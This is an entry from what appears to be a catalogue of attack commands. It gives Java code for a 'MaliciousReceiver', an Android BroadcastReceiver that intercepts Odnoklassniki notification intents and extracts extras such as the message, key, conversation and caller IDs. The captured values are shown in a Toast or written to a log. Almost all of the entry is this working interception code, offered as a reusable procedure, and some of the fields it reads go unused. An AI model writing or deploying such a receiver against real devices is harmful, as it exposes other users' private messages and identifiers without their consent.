---
data: >-
  public class MaliciousReceiver extends BroadcastReceiver { @Override public
  void onReceive(Context context, Intent intent) { if
  ("ru.ok.android.action.NOTIFY".equals(intent.getAction())) { Bundle
  localBundle = intent.getExtras(); if (localBundle != null) { String str1 =
  localBundle.getString("key"); String str2 = localBundle.getString("message");
  String str3 = localBundle.getString("cid"); if (str3 != null) { String str4 =
  localBundle.getString("caller_name"); String str5 =
  localBundle.getString("server"); return; } String str4 =
  localBundle.getString("nconversation_id"); String str5 =
  localBundle.getString("dsc_id"); Toast.makeText(context, "key:" + str1 +
  "\nmessage: " + str2 + "\ncid: " + str3 + "\nconversation_id: " + str4 +
  "\ndsc_id: " + str5, Toast.LENGTH_SHORT).show(); } } } }
tags:
  - broadcast-receiver
  - intercept
type: command
output: null
executor: java
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:42.336Z'
id: 374be6a8-375f-48ce-947c-35c92c197bd1
verified: false
validated: true
submitted: true
---
# implement-malicious-receiver

## Command

```java
public class MaliciousReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { if ("ru.ok.android.action.NOTIFY".equals(intent.getAction())) { Bundle localBundle = intent.getExtras(); if (localBundle != null) { String str1 = localBundle.getString("key"); String str2 = localBundle.getString("message"); String str3 = localBundle.getString("cid"); if (str3 != null) { String str4 = localBundle.getString("caller_name"); String str5 = localBundle.getString("server"); return; } String str4 = localBundle.getString("nconversation_id"); String str5 = localBundle.getString("dsc_id"); Toast.makeText(context, "key:" + str1 + "\nmessage: " + str2 + "\ncid: " + str3 + "\nconversation_id: " + str4 + "\ndsc_id: " + str5, Toast.LENGTH_SHORT).show(); } } } }
```

## Description

Implements a BroadcastReceiver to intercept Odnoklassniki notification intents and extract sensitive extras for display.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| getAction | Checks for "ru.ok.android.action.NOTIFY" | Yes |
| getExtras | Retrieves bundle of intent data | Yes |
| getString | Extracts values for keys like "key", "message", "cid", etc. | Yes |
| Toast.makeText | Displays captured data | No (for logging) |

## Examples

### Basic Usage

```java
// As above, full class implementation
```

### Advanced Usage

Log to file instead of Toast:
```java
Log.d("Intercepted", "key:" + str1 + " message: " + str2);
```

## Expected Output

Toast or log showing key, message, cid, conversation_id, dsc_id from intercepted intent.

## Related

- [[Related Procedure]]
